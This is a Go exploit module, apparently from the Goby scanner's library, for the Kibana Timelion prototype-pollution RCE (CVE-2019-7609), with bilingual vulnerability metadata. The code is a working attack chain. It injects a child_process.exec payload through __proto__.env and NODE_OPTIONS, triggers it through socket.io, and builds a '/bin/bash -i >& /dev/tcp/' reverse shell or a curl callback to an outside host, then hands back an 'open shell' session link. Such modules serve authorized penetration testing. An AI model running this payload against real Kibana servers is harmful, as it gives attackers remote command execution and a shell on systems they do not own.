package exploits

import (
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Kibana Unauthorized RCE (CVE-2019-7609)",
    "Description": "<p>By exploiting the vulnerability, the attacker can initiate relevant requests to kibana through the JavaScript prototype chain pollution attack in the timelion component, so as to take over the server and execute arbitrary commands on the server</p>",
    "Impact": "<p>Kibana Unauthorized RCE (CVE-2019-7609)</p>",
    "Recommendation": "<p>The manufacturer has released the bug fix, please pay attention to the update in time: <a href=\"https://www.elastic.co/cn/kibana/\">https://www.elastic.co/ en/kibana/</a></p>",
    "Product": "Kibana",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Kibana 远程代码执行漏洞（CVE-2019-7609）",
            "Product": "Kibana",
            "Description": "<p>Kibana 是为 Elasticsearch设计的开源分析和可视化平台。<br></p><p>Kibana 存在远程代码执行漏洞，攻击者利用漏洞可以通过Timelion组件中的JavaScript原型链污染攻击，向Kibana发起相关请求，从而接管所在服务器，在服务器上执行任意命令。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.elastic.co/cn/kibana/\">https://www.elastic.co/cn/kibana/</a><br></p>",
            "Impact": "<p>Kibana 存在远程代码执行漏洞，攻击者利用漏洞可以通过Timelion组件中的JavaScript原型链污染攻击，向Kibana发起相关请求，从而接管所在服务器，在服务器上执行任意命令。</p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Kibana Unauthorized RCE (CVE-2019-7609)",
            "Product": "Kibana",
            "Description": "<p>By exploiting the vulnerability, the attacker can initiate relevant requests to kibana through the JavaScript prototype chain pollution attack in the timelion component, so as to take over the server and execute arbitrary commands on the server</p>",
            "Recommendation": "<p>The manufacturer has released the bug fix, please pay attention to the update in time: <a href=\"https://www.elastic.co/cn/kibana/\">https://www.elastic.co/ en/kibana/</a><br></p>",
            "Impact": "<p>Kibana Unauthorized RCE (CVE-2019-7609)</p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "(title=\"Kibana\" || body=\"kbnVersion\" || (header=\"Kbn-Name: kibana\" && header=\"Kbn-Version\") || (body=\"kibana_dashboard_only_user\" && header=\"Kbn-Name\") || (banner=\"Kbn-Name: kibana\" && banner=\"Kbn-Version\")) || (title=\"Kibana\" || body=\"kbnVersion\" || (header=\"Kbn-Name: kibana\" && header=\"Kbn-Version\") || (body=\"kibana_dashboard_only_user\" && header=\"Kbn-Name\") || (banner=\"Kbn-Name: kibana\" && banner=\"Kbn-Version\"))",
    "GobyQuery": "(title=\"Kibana\" || body=\"kbnVersion\" || (header=\"Kbn-Name: kibana\" && header=\"Kbn-Version\") || (body=\"kibana_dashboard_only_user\" && header=\"Kbn-Name\") || (banner=\"Kbn-Name: kibana\" && banner=\"Kbn-Version\")) || (title=\"Kibana\" || body=\"kbnVersion\" || (header=\"Kbn-Name: kibana\" && header=\"Kbn-Version\") || (body=\"kibana_dashboard_only_user\" && header=\"Kbn-Name\") || (banner=\"Kbn-Name: kibana\" && banner=\"Kbn-Version\"))",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.elastic.co/cn/kibana",
    "DisclosureDate": "2021-06-30",
    "References": [
        "https://nvd.nist.gov/vuln/detail/CVE-2019-7609"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "6.0",
    "CVEIDs": [
        "CVE-2019-7609"
    ],
    "CNVD": [
        "CNVD-2019-12163"
    ],
    "CNNVD": [
        "CNNVD-201902-1035"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "shell_linux",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [
            "Kibana"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10770"
}`
	getVersion025124 := func(hostinfo *httpclient.FixUrl) string {
		cfg := httpclient.NewGetRequestConfig("/app/kibana")
		cfg.Header.Store("Referer", hostinfo.FixedHostInfo)
		resp0, err := httpclient.DoHttpRequest(hostinfo, cfg)
		if err != nil {
			return ""
		}
		reg := regexp.MustCompile(`&quot;version&quot;:&quot;(.*)&quot;,&quot;buildNumber`)
		versionCode := reg.FindStringSubmatch(resp0.Utf8Html)
		if len(versionCode) <= 1 {
			return ""
		} else {
			return versionCode[1]
		}

	}
	postPayload1111198237 := func(hostinfo *httpclient.FixUrl, kbnVersion string) string {
		cfg1 := httpclient.NewPostRequestConfig("/api/timelion/run")
		cfg1.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0")
		cfg1.Header.Store("Accept-Encoding", "gzip, deflate")
		cfg1.Header.Store("Accept", "*/*")
		cfg1.Header.Store("Content-Type", "application/json;charset=utf-8")
		cfg1.Header.Store("Referer", hostinfo.FixedHostInfo)
		cfg1.Header.Store("kbn-version", kbnVersion)
		cfg1.Header.Store("Content-Length", "116")
		cfg1.Data = `{"sheet":[".es(*)"],"time":{"from":"now-1m","to":"now","mode":"quick","interval":"auto","timezone":"Asia/Shanghai"}}`
		_, err := httpclient.DoHttpRequest(hostinfo, cfg1)
		if err != nil {
			return "error"
		}
		return ""
	}
	postPayload222222u8937 := func(hostinfo *httpclient.FixUrl, kbnVersion string, cmd string) string {
		cfg2 := httpclient.NewPostRequestConfig("/api/timelion/run")
		cfg2.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0")
		cfg2.Header.Store("Accept-Encoding", "gzip, deflate")
		cfg2.Header.Store("Accept", "*/*")
		cfg2.Header.Store("Content-Type", "application/json;charset=utf-8")
		cfg2.Header.Store("kbn-version", kbnVersion)
		cfg2.Header.Store("Content-Length", "404")
		randomStr := goutils.RandomHexString(8)
		cfg2.Data = `{"sheet":[".es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"if [ ! -f /tmp/` + randomStr + ` ];then touch /tmp/` + randomStr + ` && /bin/bash -c \\'` + cmd + `\\'; fi\");process.exit()//')\n.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')"],"time":{"from":"now-15m","to":"now","mode":"quick","interval":"10s","timezone":"Asia/Shanghai"}}`
		_, err := httpclient.DoHttpRequest(hostinfo, cfg2)
		if err != nil {
			return "error"
		}
		return ""
	}
	execPayload333339812 := func(hostinfo *httpclient.FixUrl, kbnVersion string) string {
		cfg3 := httpclient.NewGetRequestConfig("/socket.io/?EIO=3&transport=polling&t=MtjhZoM")
		cfg3.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0")
		cfg3.Header.Store("Accept-Encoding", "gzip, deflate")
		cfg3.Header.Store("Accept", "*/*")
		cfg3.Header.Store("Content-Type", "application/json;charset=utf-8")
		cfg3.Header.Store("kbn-version", kbnVersion)
		cfg3.Header.Store("kbn-xsrf", "professionally-crafted-string-of-text")
		_, err := httpclient.DoHttpRequest(hostinfo, cfg3)
		if err != nil {
			return "error"
		}
		return ""
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, isDomain := godclient.GetGodCheckURL(checkStr)

			cmd := ""
			if isDomain {
				checkUrl = strings.ReplaceAll(checkUrl, "http://", "")
				checkUrl = strings.ReplaceAll(checkUrl, "https://", "")
				if strings.Contains(checkUrl, ":") {
					checkUrl = strings.ReplaceAll(checkUrl, ":", "/")
				} else {
					checkUrl = checkUrl + "/80"
				}
				cmd = "/bin/bash -i >& /dev/tcp/" + checkUrl + " 0>&1"
			} else {
				cmd = "curl " + checkUrl
			}

			versionCode := getVersion025124(hostinfo)
			if len(versionCode) <= 1 {
				return false
			}
			if postPayload1111198237(hostinfo, versionCode) == "error" {
				return false
			}
			if postPayload222222u8937(hostinfo, versionCode, cmd) == "error" {
				return false
			}
			if execPayload333339812(hostinfo, versionCode) == "error" {
				return false
			}
			return godclient.PullExists(checkStr, 20*time.Second)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			versionCode := getVersion025124(expResult.HostInfo)
			if ss.Params["AttackType"].(string) == "shell_linux" {
				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession("reverse_linux", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					cmd := godclient.ReverseTCPByBash(rp)
					postPayload1111198237(expResult.HostInfo, versionCode)
					postPayload222222u8937(expResult.HostInfo, versionCode, cmd)
					go execPayload333339812(expResult.HostInfo, versionCode)
					select {
					case webConsleID := <-waitSessionCh:
						log.Println("[DEBUG] session created at:", webConsleID)
						if u, err := url.Parse(webConsleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 40):
					}
				}
			}
			return expResult
		},
	))
}
